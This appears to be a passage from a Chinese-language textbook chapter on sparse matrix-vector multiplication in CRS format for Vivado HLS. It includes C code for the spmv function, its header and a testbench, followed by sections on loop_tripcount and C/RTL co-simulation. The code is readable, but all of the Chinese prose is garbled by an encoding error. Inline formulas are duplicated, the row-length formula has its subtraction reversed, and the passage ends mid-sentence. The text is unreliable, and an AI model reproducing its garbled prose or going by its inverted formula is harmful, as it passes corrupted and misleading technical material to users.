æ•°ç»„ä¸­çš„å€¼å°†ä¼šé‡å¤å‡ºç°ã€‚\nä»å›¾6.1 aï¼‰ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è¡Œä¼˜å…ˆçš„æ–¹å¼éå†çŸ©é˜µï¼Œä»è€Œç¡®å®šå€¼ï¼ˆvaluesï¼‰æ•°ç»„åœ¨CRSä¸­çš„å½¢å¼ã€‚åªè¦å‘ç°ä¸€ä¸ªé0å…ƒç´ ï¼Œå®ƒçš„å€¼ä¼šè¢«ä¿å­˜åœ¨ä¸‹ä¸€ä¸ªç´¢å¼• ii ä¸­ï¼ŒåŒæ—¶ï¼Œå®ƒçš„åˆ—å·columnIndex[i] ä¼šè¢«ä¿å­˜åœ¨åˆ—æ•°ç»„ä¸­ã€‚å¦å¤–ï¼Œåœ¨æˆ‘ä»¬è®¿é—®ä¸€ä¸ªæ–°è¡Œçš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¿å­˜ä¸‹ä¸€ä¸ªå€¼çš„ç´¢å¼• ii åœ¨rowPtræ•°ç»„ä¸­ã€‚æ‰€ä»¥ï¼ŒrowPtr æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ€»æ˜¯0ã€‚ä»å›¾ 6.1 b)ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠçŸ©é˜µè½¬æ¢ä¸ºäºŒä½æ•°ç»„è¡¨ç¤ºçš„æ–¹å¼ã€‚ç¬¬ä¸€æ­¥æ˜¯æ ¹æ®rowPtræ•°ç»„ï¼Œç¡®å®šæ¯ä¸€è¡Œä¸­é0 å…ƒç´ çš„ä¸ªæ•°ã€‚å¯¹è¡Œ ii è€Œè¨€ï¼Œè¯¥è¡Œä¸­å…ƒç´ çš„æ•°ç›®ä¸ºrowPtr[i]-rowPtr[i+1]rowPt**r[i]âˆ’rowPt**r[i+1]çš„å·®å€¼ã€‚æ‰€ä»¥å½“å‰è¡Œçš„å€¼å¯ä»¥ä»valuesæ•°ç»„values[rowPtr[i]] å¼€å§‹ï¼Œé€šè¿‡é€’å½’å¾—åˆ°ã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹çŸ©é˜µä¸­ï¼Œå› ä¸ºå‰ rowPtr æ•°ç»„å‰2ä¸ªå…ƒç´ æ˜¯0å’Œ2ï¼Œæ‰€ä»¥æˆ‘ä»¬çŸ¥é“ç¬¬ä¸€è¡Œæœ‰2ä¸ªé0å…ƒç´ ï¼Œå³value[0] å’Œvalue[1] ã€‚ç¬¬ä¸€ä¸ªé0å…ƒç´ åœ¨valuesæ•°ç»„ä¸­,value[0] æ˜¯3ã€‚è¯¥å€¼æ‰€å¯¹åº”çš„åˆ—å·ä¸º1ï¼Œå› ä¸ºcolumnIndex[0]=0columnIndex[0]=0ã€‚ä»¥æ­¤ç±»æ¨ï¼ŒçŸ©é˜µä¸­ç¬¬äºŒè¡Œå…ƒç´ çš„ä¸ªæ•°ä¸ºk\\in[2,4)kâˆˆ[2,4),ç¬¬ä¸‰è¡Œçš„å…ƒç´ ä¸ªæ•°ä¸ºk \\in [4,7)kâˆˆ[4,7)ã€‚æœ€åï¼Œå…±æœ‰9ä¸ªé0å…ƒç´ åœ¨çŸ©é˜µä¸­ï¼Œæ‰€ä»¥rowPtræœ€åä¸€ä¸ªå€¼æ˜¯9ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #include \"spmv.h\" void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE]){ L1: for (int i = 0; i \u003c NUM_ROWS; i++) { DTYPE y0 = 0; L2: for (int k = rowPtr[i]; k \u003c rowPtr[i+1]; k++) { #pragma HLS unroll factor=8  #pragma HLS pipeline  y0 += values[k] * x[columnIndex[k]]; } y[i] = y0; } }   å›¾6.2: ä¸»ä½“ä»£ç æ¼”ç¤ºäº†ç³»æ•°çŸ©é˜µå‘é‡ä¹˜ï¼ˆSpMVï¼‰y=M.xçš„è®¡ç®—ã€‚é‡‡ç”¨CRSçš„æ–¹å¼ï¼Œé€šè¿‡rowPt*ã€columnIndex å’Œ value ä¿å­˜çŸ©é˜µMã€‚ç¬¬ä¸€ä¸ªforå¾ªç¯é€šè¿‡è¿­ä»£è®¿é—®æ¯ä¸€è¡Œï¼Œç¬¬äºŒä¸ªforå¾ªç¯è®¿é—®æ¯ä¸€åˆ—ï¼Œå®ç°çŸ©é˜µMä¸­é0å…ƒç´ å’Œå‘é‡ä¸­å¯¹åº”çš„å…ƒç´ ç›¸ä¹˜å¹¶ä¿å­˜å€¼åœ¨å‘é‡yä¸­ã€‚\nç»™å®šä¸€ä¸ªäºŒç»´æ•°ç»„è¡¨ç¤ºä¸€ä¸ªçŸ©é˜µï¼Œé€šè¿‡Cä»£ç å®ç°çŸ©é˜µCRSæ ¼å¼ã€‚ç¼–å†™å¯¹åº”çš„Cä»£ç å®ç°å°†çŸ©é˜µä»CRSæ ¼å¼è½¬åŒ–ä¸ºäºŒç»´æ•°ç»„çš„å½¢å¼ã€‚\nç»“æœè¡¨æ˜ï¼Œé€šè¿‡é‡‡ç”¨CRSçš„æ–¹å¼ï¼Œæˆ‘ä»¬èƒ½é«˜æ•ˆçš„å®ç°ç¨€ç–çŸ©é˜µä¹˜æ³•ï¼Œä¸éœ€è¦å°†çŸ©é˜µè½¬åŒ–ä¸ºäºŒç»´å½¢å¼ã€‚å®é™…ä¸Šï¼Œ å¯¹äºå¤§å‹çš„çŸ©é˜µä»…ä»…åªæœ‰ä¸€å°éƒ¨åˆ†é0å…ƒç´ ï¼Œç¨€ç–çŸ©é˜µå‘é‡ä¹˜æ³•ä¼šæ¯”ç¬¬å››ç« ä¸­è®¨è®ºçš„å¯†é›†çŸ©é˜µå‘é‡ä¹˜é«˜æ•ˆå¾ˆå¤šã€‚å› ä¸ºæˆ‘ä»¬ç›´æ¥æ‰¾åˆ°é0å…ƒç´ ï¼Œå¹¶æ‰§è¡Œé0å…ƒç´ å¯¹åº”çš„è¿ç®—ã€‚\n6.2 åŸºæœ¬å®ç° å›¾6.2 æä¾›äº†åŸºæœ¬ä»£ç å¯¹ç³»æ•°çŸ©é˜µä¹˜æ³•çš„å®ç°ã€‚å‡½æ•°spmvå‡½æ•°æœ‰5ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯rowPtrã€columnIndex ï¼Œä»¥åŠ values å¯¹åº”çŸ©é˜µ M çš„ CRS æ ¼å¼ä¸­åŒ…å«çš„3ä¸ªå‚æ•°ï¼Œè¿™å’Œå›¾6.1ä¸­æè¿°çš„æ•°æ®ç»“æ„ç­‰ä»·ã€‚å‚æ•° yy ç”¨äºä¿å­˜è¾“å‡ºçš„ç»“æœï¼Œå‚æ•°xè¡¨ç¤ºè¾“å…¥çš„è¢«ä¹˜å‘é‡xxã€‚å˜é‡NUM_ROWSè¡¨ç¤ºçŸ©é˜µMä¸­è¡Œå·ã€‚å˜é‡NNZè¡¨ç¤ºçŸ©é˜µä¸­é0å…ƒç´ çš„ä¸ªæ•°ã€‚æœ€åï¼Œå˜é‡SIZEè¡¨ç¤ºæ•°ç»„xå’Œæ•°ç»„yä¸­å…ƒç´ çš„ä¸ªæ•°ã€‚\nå¤–å±‚forå¾ªç¯æ ‡ç­¾ä¸ºL1ï¼Œå¯¹çŸ©é˜µçš„è¡Œè¿›è¡Œéå†ã€‚å°†çŸ©é˜µå½“å‰çš„è¡Œä¸å‘é‡xç›¸ä¹˜ï¼Œå¾—åˆ°è¾“å‡ºçš„ç»“æœyyã€‚å†…å±‚å¾ªç¯æ ‡ç­¾ä¸ºL2ï¼Œå®ç°å¯¹çŸ©é˜µMä¸­æ¯åˆ—å…ƒç´ çš„éå†ã€‚L2å¾ªç¯è¿­ä»£è®¡ç®—rowPtr[i+1]-rowPtr[i]rowPt**r[i+1]âˆ’rowPt**r[i]è®¡ç®—æ¯ä¸€è¡Œé0å…ƒç´ çš„ä¸ªæ•°ã€‚æ¯æ¬¡å¾ªç¯è®¡ç®—ï¼Œèƒ½ä»valueæ•°ç»„ä¸­è¯»å–çŸ©é˜µMçš„é0å…ƒç´ ç„¶åå¯¹åº”çš„ä»xæ•°ç»„ä¸­å–å¾—è¢«ä¹˜å‘é‡xçš„å€¼ï¼Œå¯¹åº”ç›¸ä¹˜ã€‚cloumnIndex[k] ä¸­çš„å€¼ä¿å­˜äº†å¯¹åº”çš„åˆ—å·kã€‚\n1 2 3 4 5 6 7 8 9 10 11  #ifndef __SPMV_H__ #define __SPMV_H__  const static int SIZE = 4; // SIZE of square matrix const static int NNZ = 9; //Number of non-zero elements const static int NUM_ROWS = 4;// SIZE; typedef float DTYPE; void spmv(int rowPtr[NUM_ROWS+1], int columnIndex[NNZ], DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE]); #endif // __MATRIXMUL_H__ not defined   å›¾6.3ï¼š spmvå‡½æ•°å’Œæ¿€åŠ±çš„å¤´æ–‡ä»¶\n6.3 æµ‹è¯•å¹³å° å›¾6.4 å±•ç¤ºäº†ä¸€ä¸ªé’ˆå¯¹spmvå‡½æ•°æµ‹è¯•å¹³å°ã€‚æµ‹è¯•å¹³å°é€šè¿‡å®šä¹‰matrixvectorå‡½æ•°ï¼Œç›´æ¥å®ç°çŸ©é˜µå‘é‡ä¹˜æ³•ï¼Œå®ƒä¸è€ƒè™‘çŸ©é˜µæ˜¯å¦ä¸ºç¨€ç–çŸ©é˜µä»¥åŠçŸ©é˜µæ˜¯å¦é‡‡ç”¨CRSæ–¹å¼è¡¨ç¤ºã€‚æˆ‘ä»¬æ¯”è¾ƒmatrixvectorå‡½æ•°è¾“å‡ºå’Œspmvå‡½æ•°çš„è¾“å‡ºã€‚\nåœ¨é€šå¸¸çš„æµ‹è¯•å¹³å°ä¸­ï¼Œéœ€è¦å®ç°çš„å‡½æ•°éƒ½ä¼šæœ‰ä¸ªâ€œé»„é‡‘\"å‚è€ƒï¼Œä½œä¸ºç”¨æˆ·æœŸæœ›ç»¼åˆçš„ç»“æœã€‚æµ‹è¯•å¹³å°ä¼šæ¯”è¾ƒé»„é‡‘ç”¨ä¾‹çš„è¾“å‡ºå’Œé€šè¿‡VivadoÂ®HLSç»¼åˆçš„ä»£ç æ‰§è¡Œç»“æœã€‚æœ€å¥½çš„å®è·µæ–¹å¼æ˜¯ï¼Œæµ‹è¯•å¹³å°æ—¢å¯ä»¥ç”¨äºé»„é‡‘ç”¨ä¾‹ï¼Œä¹Ÿå¯ç”¨äºè¢«ç»¼åˆçš„ä»£ç ã€‚è¿™æ ·å°±ä¿è¯äº†ä¸¤è€…å®ç°çš„æ­£ç¡®æ€§ã€‚\næµ‹è¯•å¹³å°åœ¨ä¸»å‡½æ•°mainä¸­æ‰§è¡Œã€‚è¿™é‡Œæˆ‘ä»¬é€šè¿‡è®¾ç½®failå˜é‡åˆå§‹åŒ–ä¸º0ï¼Œå½“spmvå‡½æ•°çš„è¾“å‡ºæˆç»“æœä¸matrixvectorå‡½æ•°è¾“å‡ºç»“æœä¸ç›¸åŒæ˜¯æ—¶ï¼Œå˜é‡ç½®1ã€‚å®šä¹‰ä¸çŸ©é˜µMç›¸å…³çš„å˜é‡ã€è¢«ä¹˜å‘é‡xx å’Œè¾“å‡ºç»“æœyyã€‚å¯¹äºçŸ©é˜µMï¼Œå³æœ‰æ™®é€šæ¨¡å¼ï¼Œä¹Ÿæœ‰CSRæ¨¡å¼ï¼ˆä¿å­˜ä¸ºvaluesã€columnIndexã€rowPtrï¼‰ã€‚çŸ©é˜µM çš„valueå¦‚å›¾6.1ä¸­æ‰€ç¤ºï¼Œè¾“å‡ºå‘é‡yyæœ‰ä¸¤ç§ï¼Œå…¶ä¸­y_swæ•°ç»„ä¿å­˜matrixvectorå‡½æ•°è¾“å‡ºçš„ç»“æœï¼Œyæ•°ç»„ä¿å­˜spmvå‡½æ•°è¾“å‡ºçš„ç»“æœã€‚\nåœ¨å®šä¹‰å¥½æ‰€æœ‰çš„è¾“å…¥å˜é‡å’Œè¾“å‡ºå˜é‡ä¹‹åï¼Œåˆ†åˆ«è°ƒç”¨spmvå‡½æ•°å’Œmatrixvectorå‡½æ•°å¹¶è¾“å…¥åˆé€‚çš„æ•°æ®ã€‚ æ¥ä¸‹æ¥çš„forå¾ªç¯ç”¨äºæ¯”è¾ƒy_swå’Œyä¸­çš„æ¯ä¸€ä¸ªå¯¹åº”çš„ç»“æœã€‚å¦‚æœå…¶ä¸­ä¸€ä¸ªä¸ç›¸åŒï¼Œåˆ™å°†fail æ ‡å¿—ç½®1ã€‚æœ€åï¼Œç¨‹åºä¼šæ‰“å°æµ‹è¯•çš„ç»“æœå¹¶è¿”å›failå˜é‡ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  #include \"spmv.h\"#include \u003cstdio.h\u003e void matrixvector(DTYPE A[SIZE][SIZE], DTYPE *y, DTYPE *x) { for (int i = 0; i \u003c SIZE; i++) { DTYPE y0 = 0; for (int j = 0; j \u003c SIZE; j++) y0 += A[i][j] * x[j]; y[i] = y0; } } int main(){ int fail = 0; DTYPE M[SIZE][SIZE] = { {3,4,0,0},{0,5,9,0},{2,0,3,1},{0,4,0,6} }; DTYPE x[SIZE] = {1,2,3,4}; DTYPE y_sw[SIZE]; DTYPE values[] = {3,4,5,9,2,3,1,4,6}; int columnIndex[] = {0,1,1,2,0,2,3,1,3}; int rowPtr[] = {0,2,4,7,9}; DTYPE y[SIZE]; spmv(rowPtr, columnIndex, values, y, x); matrixvector(M, y_sw, x); for(int i = 0; i \u003c SIZE; i++) if(y_sw[i] != y[i]) fail = 1; if(fail == 1) printf(\"FAILED\\n\"); else printf(\"PASS\\n\"); return fail; }   å›¾6.4 ï¼š ä¸€ä¸ªç®€å•spmvå‡½æ•°çš„ç®€å•æµ‹è¯•å¹³å°ã€‚æµ‹è¯•å¹³å°ç”Ÿæˆäº†ä¸€ä¸ªç”¨ä¾‹ï¼Œå¹¶ä¸”è®¡ç®—çŸ©é˜µçš„å‘é‡ä¹˜æ³•é€šè¿‡ç¨€ç–çŸ©é˜µä¹˜æ³•ï¼ˆspmvï¼‰å’Œéç³»æ•°çŸ©é˜µä¹˜æ³•(matrixvector)ã€‚\nè¿™ä¸ªæµ‹è¯•å¹³å°ç›¸å¯¹ç®€å•å¹¶ä¸”å¯èƒ½æ— æ³•å……åˆ†éªŒè¯æ‰€æœ‰çš„è¾“å…¥éƒ½èƒ½æ­£å¸¸è¾“å‡ºã€‚æœ€ä¸»è¦çš„åŸå› æ˜¯ï¼Œå®ƒä»…ä»…åªç”¨äº†ä¸€ä¸ªçŸ©é˜µä½œä¸ºä¾‹å­ï¼Œç›¸åï¼Œä¸€ä¸ªå¥½çš„æ¿€åŠ±ä¼šæµ‹è¯•è®¸å¤šçŸ©é˜µã€‚é€šå¸¸ï¼Œä¼šé€šè¿‡éšæœºçš„æ–¹å¼äº§ç”Ÿè¾“å…¥çš„æµ‹è¯•ç”¨ä¾‹ï¼Œå¹¶ä¸”é‡ç‚¹æµ‹è¯•è¾¹ç•Œç”¨ä¾‹ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä¸ä»…è¦ä¿è¯å€¼æ­£ç¡®è®¡ç®—ï¼ŒåŒæ—¶ä¿è¯é€šè¿‡åŠ é€Ÿå™¨æ­£ç¡®çš„è¢«æ‰§è¡Œäº†ï¼Œè€Œä¸”ç¼–è¯‘æ—¶é—´ç›¸å…³çš„parameteræ”¹å˜ä¼šåœ¨å®ç°ä¸åŒåŠ é€Ÿå•å…ƒå€¼æŠ˜ä¸­ã€‚æœ€å…³é”®çš„æ˜¯ï¼Œåœ¨ç›¸åŒçš„parameterä¸Šï¼Œæˆ‘ä»¬èƒ½é€šè¿‡éšæœºäº§ç”Ÿå¾ˆå¤šè¾“å…¥æ•°æ®æ¥è¿›è¡Œæµ‹è¯•ã€‚ç¼–è¯‘æ—¶é—´ç›¸å…³çš„å‚æ•°æ¯æ¬¡å‘ç”Ÿå˜åŒ–ï¼Œéƒ½éœ€è¦æˆ‘ä»¬é‡æ–°ç¼–è¯‘ä»£ç ã€‚\nåˆ›å»ºä¸€ä¸ªå¤æ‚çš„æ¿€åŠ±æ¥ï¼Œé€šè¿‡éšæœºæ•°æ–¹å¼ç”Ÿæˆè®¸å¤šç»„æµ‹è¯•æ•°æ®ã€‚ç¨€ç–çŸ©é˜µç¼–è¯‘æ—¶é—´å‚æ•°åº”è¯¥æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼ˆä¾‹å¦‚ï¼ŒSIZEï¼ŒNNZ ç­‰ï¼‰ã€‚åˆ›å»ºä¸€ä¸ªHLSç»¼åˆè„šæœ¬ï¼Œåœ¨ç¼–è¯‘æ—¶é—´å‚æ•°åˆç†èŒƒå›´æ”¹å˜æ—¶ï¼Œèƒ½æ‰§è¡Œä»£ç å¾ˆå¤šæ¬¡ã€‚\n6.4 æŒ‡å®šå¾ªç¯çš„å±æ€§ å¦‚æœç›´æ¥å°†ä¸Šè¿°ä»£ç è¿›è¡Œç»¼åˆï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å‡½æ•°è¿è¡Œçš„æ—¶é’Ÿå‘¨æœŸåŠèµ„æºå ç”¨ç‡ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¸èƒ½å¾—åˆ°æ¨¡å—æ‰§è¡Œæ‰€éœ€çš„æ—¶é’Ÿå‘¨æœŸã€ä»»åŠ¡æ‰§è¡Œçš„å»¶è¿Ÿå’Œä»»åŠ¡æ‰§è¡Œä¹‹é—´çš„é—´éš”ã€‚å› ä¸ºè¿™äº›éƒ½å–ä¾èµ–äºè¾“å…¥æ•°æ®ï¼Œç”±spmvå‡½æ•°å¤–éƒ¨å› ç´ å†³å®šã€‚æœ€ä¸»è¦çš„å› ç´ æ˜¯ï¼Œå†…å±‚å¾ªç¯æ‰§è¡Œçš„æ¬¡æ•°æ˜¯ç”±çŸ©é˜µMä¸­é0å…ƒç´ ä¸ªæ•°å†³å®šçš„ã€‚é0å…ƒç´ çš„ä¸ªæ•°åœ¨ä»£ç ä¸­æ˜¯ç”±å¸¸é‡NNZå†³å®šçš„ï¼Œè™½ç„¶å¯ä»¥è°ƒç”¨å‡½æ•°è®¡ç®—ä¸åŒå¤§å°çš„çŸ©é˜µï¼Œä½†æ˜¯å®é™…è¿­ä»£æ¬¡æ•°æ˜¯å’Œè¾“å…¥æ•°æ®ç›¸å…³çš„ã€‚å¦å¤–ï¼Œæ€§èƒ½ä¹Ÿä¼šå› ä¸ºé0å…ƒç´ çš„åˆ†å¸ƒã€ç»¼åˆä¼˜åŒ–çš„çº¦æŸäº§ç”Ÿä¸åŒã€‚æ›´å¤æ‚çš„æ˜¯ï¼Œè¿­ä»£çš„æ¬¡æ•°ç”±è¾“å…¥å†³å®šï¼Œè®¸å¤šå¯èƒ½çš„è¾“å…¥å¹¶æ²¡æœ‰è¢«éå†ã€‚æ‰€ä»¥ï¼Œå¯¹äºå·¥å…·è€Œè¨€ï¼Œä¸é€šè¿‡å¤æ‚çš„åˆ†æå’Œé¢å¤–çš„ä¿¡æ¯ï¼Œå·¥å…·æ˜¯ä¸èƒ½çŸ¥é“spmvå‡½æ•°æ‰§è¡Œéœ€è¦å¤šå°‘æ—¶é’Ÿå‘¨æœŸã€‚VivadoÂ®HLS å·¥å…·ä¹Ÿä¸èƒ½è¿›è¡Œä¸Šè¿°çš„åˆ†æã€‚\nspmvå‡½æ•°èƒ½æ­£å¸¸å·¥ä½œçš„å‰ææ¡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿè¯æ˜ç»™å®šçš„å‰ææ¡ä»¶ï¼ŒçŸ©é˜µä¸­æ¯ä¸ªé0å…ƒç´ å®æ˜¯ä¸æ˜¯åœ¨å¯¹åº”ä¸€æ¬¡å†…å±‚å¾ªçš„æ‰§è¡Œï¼Ÿ\næœ‰å‡ ç§æ–¹å¼èƒ½å¸®åŠ©å·¥å…·è¿›è¡Œæ€§èƒ½çš„åˆ†æï¼Œå…¶ä¸­ä¸€ç§æ–¹å¼å°±æ˜¯æƒ³VivadoÂ®HLSæä¾›å¾ªç¯è¾¹ç•Œçš„é¢å¤–ä¿¡æ¯ã€‚è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨loop_tripcount directiveå®ç°ï¼Œå®ƒèƒ½è®©è®¾è®¡è€…æŒ‡å®šæœ€å°ã€æœ€å¤§å’Œå¹³å‡è¿­ä»£æ¬¡æ•°é’ˆå¯¹ç‰¹å®šçš„å¾ªç¯ã€‚é€šè¿‡æä¾›è¿™äº›å€¼ï¼Œ VivadoÂ®HLS èƒ½æä¾›æ—¶é’Ÿå‘¨æœŸçº§åˆ«çš„è¯„ä¼°ã€‚\nä½¿ç”¨loop_tripcount directive ç”¨å˜é‡æŒ‡å®šå¾ªç¯çš„æœ€å°ï¼Œæœ€å¤§å’Œå¹³å‡è¿­ä»£æ¬¡æ•°ï¼Œè¿™æ ·VivadoÂ®HLS å·¥å…·èƒ½å¯¹å½“å‰è®¾è®¡æ—¶é’Ÿå‘¨æœŸæ•°ç›®è¿›è¡Œä¼°è®¡ã€‚è¿™äº›ä¸å½±å“æœ€åç»¼åˆçš„ç»“æœï¼Œåªä¼šå½±å“ç»¼åˆæŠ¥å‘Šã€‚\nå¯¹spmvå‡½æ•°ä½¿ç”¨loop_tripcount directiveï¼Œè¯­æ³•æ ¼å¼ # pragma HLS loop_tripcount min=X, max=Y, avg=Z å…¶ä¸­Xï¼ŒYï¼ŒZæ­£çš„å¸¸é‡ã€‚å“ªä¸ªå¾ªç¯éœ€è¦ä½¿ç”¨directive?å½“æ”¹å˜å‚æ•°ï¼ˆminã€maxå’Œavgï¼‰ä»¥åï¼Œç»¼åˆæŠ¥å‘Šæœ‰ä»€ä¹ˆä¸åŒï¼Ÿè¿™å¯¹æ—¶é’Ÿå‘¨æœŸæœ‰å½±å“å—ï¼Ÿè¿™å¯¹èµ„æºå ç”¨æœ‰å½±å“å—ï¼Ÿ\nloop_tripcount å¼•å¯¼èƒ½å¸®åŠ©è®¾è®¡è€…å¯¹å‡½æ•°çš„æ€§èƒ½æœ‰ä¸ªåŸå§‹çš„ä¼°è®¡ã€‚è¿™æ ·èƒ½æ¯”è¾ƒç›¸åŒçš„å‡½æ•°é€šè¿‡ä½¿ç”¨ä¸åŒçš„directivesæˆ–è€…å¯¹ä»£ç æœ¬èº«é‡æ„ã€‚ä½†æ˜¯ï¼Œè¿™ä¸èƒ½ç¡®å®šminã€maxå’Œ avg å‚æ•°ã€‚è¿™ä¹Ÿå¾ˆéš¾ç¡®å®šè¾¹ç•Œæ¡ä»¶minå’Œmaxçš„å€¼ã€‚å¦‚æœæœ‰æµ‹è¯•å¹³å°ï¼Œå°±æœ‰ä¸€ç§æ›´å‡†ç¡®çš„æ–¹å¼ç”¨äºè®¡ç®—spmvå‡½æ•°æ‰§è¡Œçš„æ—¶é’Ÿå‘¨æœŸæ•°ï¼Œé‚£å°±æ˜¯C/RTLååŒä»¿çœŸã€‚\n6.5 C/RTL ååŒä»¿çœŸ C/RTL ååŒä»¿çœŸèƒ½è‡ªåŠ¨åŒ–æµ‹è¯•VivadoÂ®HLSå·¥å…·ç”Ÿæˆçš„RTLä»£ç ï¼Œåªéœ€è¦åœ¨ç»¼åˆçš„æ—¶å€™æä¾›æµ‹è¯•å¹³å°ã€‚æ¯æ¬¡æ‰§è¡Œç»¼åˆä»¥åçš„ä»£ç å’Œæä¾›çš„æµ‹è¯•å¹³å°ï¼Œè®°å½•è¾“å…¥å’Œè¾“å‡ºç»“æœã€‚è¾“å…¥çš„å€¼æŒ‰ç…§æ—¶é’Ÿè½¬æ¢æˆè¾“å…¥å‘é‡ã€‚è¿™é‡Œçš„è¾“å…¥å‘é‡ç”¨äºé’ˆå¯¹ç”Ÿæˆçš„RTLä»£ç è¿›è¡Œä»¿çœŸï¼ŒåŒæ—¶è®°å½•è¾“å‡ºå‘é‡ã€‚æ›´æ–°ç»¼åˆåçš„ä»£ç ï¼Œ å†æ¬¡è¿è¡Œæµ‹è¯•å¹³å°å¹¶ä¿å­˜è¾“å…¥å’Œè¾“å‡ºæ•°æ®ã€‚æµ‹è¯•å¹³å°å¦‚æœè¿”å›å€¼æ˜¯0ï¼Œåˆ™è¡¨ç¤ºæˆåŠŸï¼›è‹¥æ¿€åŠ±è¿”å›é0å€¼ï¼Œåˆ™è¡¨ç¤ºå¤±è´¥ã€‚\nC/RTL ååŒä»¿çœŸæµç¨‹å°†VIvadoÂ®HLS ç”Ÿæˆçš„RTLä»£ç ï¼Œé€šè¿‡C æµ‹è¯•å¹³å°ï¼Œå®ç°æ—¶é’Ÿå‘¨æœŸçº§åˆ«çš„ä»¿çœŸã€‚è¿™æ ·ï¼Œå°±èƒ½å‡†ç¡®å¯¹ç”Ÿæˆçš„RTLä»£ç è¿›è¡Œæ€§èƒ½è¯„ä¼°ï¼Œå³ä½¿æ€§èƒ½ä¸è¾“å…¥æ•°æ®æœ‰å…³ã€‚è¢«ç»¼åˆçš„å‡½æ•°è¿è¡Œå‘¨æœŸæœ€å°å€¼ï¼Œæœ€å¤§å€¼ï¼Œå¹³å‡å€¼ä»¥åŠé—´éš”åœ¨ä»¿çœŸå®Œæˆä»¥åéƒ½èƒ½å‡†ç¡®çš„å¾—åˆ°ã€‚\næ³¨æ„è¿™äº›å’Œæ—¶é’Ÿå‘¨æœŸç›¸å…³çš„å‚æ•°æ˜¯é€šè¿‡æ¿€åŠ±ä¸­æµ‹è¯•æ•°æ®å¾—åˆ°çš„ã€‚æ‰€ä»¥ï¼Œç»“æœçš„è´¨é‡å’Œæµ‹è¯•å¹³å°çš„è´¨é‡æ¯æ¯ç›¸å…³ã€‚å¦‚æœæµ‹è¯•å¹³å°æ²¡æœ‰å¾ˆå¥½çš„å¯¹å‡½æ•°æ‰§è¡Œæµ‹è¯•ï¼Œé‚£ä¹ˆç»“æœå°†ä¸å‡†ç¡®ã€‚å¦å¤–ï¼Œè¾“å…¥æµ‹è¯•å‘é‡éƒ½æ˜¯åŸºäºç†æƒ³çš„æ—¶åºï¼Œä¸èƒ½åæ˜ æ¨¡å‹å®é™…å·¥ä½œæ—¶ï¼Œå¤–éƒ¨æ¥å£å¯¹å‡½æ•°çš„å½±å“ã€‚å®é™…çš„æ€§èƒ½å¯èƒ½ä¼šæ¯”ä»¿çœŸçš„è¦ä½ï¼Œå¦‚æœæ‰§è¡Œè¿‡ç¨‹ä¸­é˜»å¡åœ¨è¾“å…¥æ•°æ®æˆ–å¯¹å¤–éƒ¨å­˜å‚¨çš„è®¿é—®ä¸Šã€‚ä¸è¿‡ï¼Œå¯¹äºå¾ªç¯è¾¹ç•Œè°ƒè¯•æ—¶å˜é‡çš„æƒ…å†µï¼Œè®¾è®¡è€…å¯ä»¥é€šè¿‡ååŒä»¿çœŸçš„æ–¹å¼ç¡®å®šæ—¶é’Ÿå‘¨æœŸä¸ªæ•°ã€‚\nC/RTLååŒä»¿çœŸèƒ½æä¾›å¾ªç¯è¾¹ç•Œæ˜¯å˜é‡çš„å‡½æ•°çš„å»¶è¿Ÿã€‚å®ƒåé¦ˆå‡½æ•°è¿è¡Œæ—¶å»¶è¿Ÿçš„æœ€å°å€¼ã€æœ€å¤§å€¼å’Œå¹³å‡å€¼ä»¥åŠå‡½æ•°è¿è¡Œé—´éš”ã€‚è¿™äº›å»¶è¿Ÿå’Œæµ‹è¯•å¹³å°è¾“å…¥çš„æ•°æ®æ˜¯å¼ºç›¸å…³çš„ã€‚\nå›¾6.5 spmvå‡½æ•°å†…éƒ¨å¾ªç¯æµæ°´æ‰§è¡Œè¿‡ç¨‹å’Œç»“æ„\nå½“é‡‡ç”¨å›¾6,4æä¾›çš„æµ‹è¯•å¹³å°æ—¶ï¼Œå‡½æ•°è¿è¡Œçš„æœ€å°å€¼ã€æœ€å¤§å€¼å’Œå¹³å‡å€¼ä»¥åŠå‡½æ•°é—´éš”æ˜¯å¤šå°‘ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Ÿ\n6.6 å¾ªç¯çš„ä¼˜åŒ–ä¸æ•°ç»„çš„åˆ†å— æˆ‘ä»¬å¯ä»¥é€šè¿‡VivadoÂ®HLS å·¥å…·å¾—åˆ°å½“å‰å‡½æ•°çš„æ€§èƒ½å’Œé¢ç§¯çš„è¯„ä¼°ç»“æœï¼Œç„¶åå¯ä»¥è€ƒè™‘å¦‚ä½•å¯¹å‡½æ•°è¿›è¡Œä¼˜åŒ–ã€‚æµæ°´çº¿ã€å¾ªç¯å±•å¼€ã€æ•°ç»„åˆ†å—æ˜¯ç¬¬ä¸€ç±»æœ€å¸¸ç”¨çš„ä¼˜åŒ–æ–¹æ³•ã€‚æœ€å…¸å‹çš„æ–¹å¼æ˜¯ä»æœ€å†…å±‚çš„å¾ªç¯ï¼Œç„¶åæ ¹æ®éœ€è¦å‘å¤–å±‚å¾ªç¯è¿›è¡Œã€‚\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ å¯¹æœ€å†…å±‚çš„L2å¾ªç¯è¿›è¡Œæµæ°´çº¿åŒ–ä¹Ÿè®¸æ˜¯æˆ‘ä»¬æœ€å…ˆå’Œæœ€å®¹æ˜“æƒ³åˆ°çš„ä¼˜åŒ–æ–¹å¼ã€‚è¿™ä¸ªè¿ç»­è¿­ä»£çš„å¾ªç¯åœ¨æ‰§è¡Œä¸Šæµæ°´ä»¥åï¼Œæ€»ä½“è¿è¡Œä¼šåŠ 